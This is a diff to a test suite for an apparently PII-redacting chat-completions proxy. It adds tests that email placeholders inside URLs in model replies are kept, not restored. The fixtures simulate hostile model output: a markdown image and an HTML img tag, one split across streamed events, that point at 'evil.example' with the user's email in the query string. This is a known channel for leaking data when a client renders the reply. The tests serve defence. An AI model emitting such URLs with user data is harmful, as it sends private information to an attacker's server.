@@ -479,10 +479,28 @@ describe('tool-call arguments', () => {
     expect(args.q).toMatch(new RegExp(`^see https://evil\\.example/\\?a=⟦EMAIL_\\d+⟧ and ${EMAIL.replaceAll('.', '\\.')}$`))
   })
 
-  it('restores a placeholder inside a URL in ordinary reply text', async () => {
-    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `https://example.test/?q=${ids(entry)[0]}` } }] } })
+  it('keeps a placeholder inside a URL in reply text, where a client may render it as an image or link', async () => {
+    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `![](https://evil.example/p.png?e=${ids(entry)[0]}) and ${ids(entry)[0]}` } }] } })
     const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
-    expect(body.choices[0].message.content).toBe(`https://example.test/?q=${EMAIL}`)
+    expect(body.choices[0].message.content).toMatch(new RegExp(`^!\\[\\]\\(https://evil\\.example/p\\.png\\?e=⟦EMAIL_\\d+⟧\\) and ${EMAIL.replaceAll('.', '\\.')}$`))
+    expect(logs.at(-1)).toMatch(/ kept 1 /)
+  })
+
+  it('keeps a placeholder inside a URL in streamed reply text split across events', async () => {
+    reply = entry => {
+      const [E] = ids(entry)
+      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
+      const parts = ['<img src="https://evil.example/?e=', E.slice(0, 3), `${E.slice(3)}"> ${E}`]
+      return {
+        sse: [
+          ...sse(parts.map(part => [undefined, { ...env, choices: [{ index: 0, delta: { content: part }, finish_reason: null }] }])),
+          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] }], [undefined, '[DONE]']]),
+        ],
+      }
+    }
+    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
+    const content = events(text).map(event => event.choices[0].delta.content ?? '').join('')
+    expect(content).toMatch(new RegExp(`^<img src="https://evil\\.example/\\?e=⟦EMAIL_\\d+⟧"> ${EMAIL.replaceAll('.', '\\.')}$`))
   })
 })
 
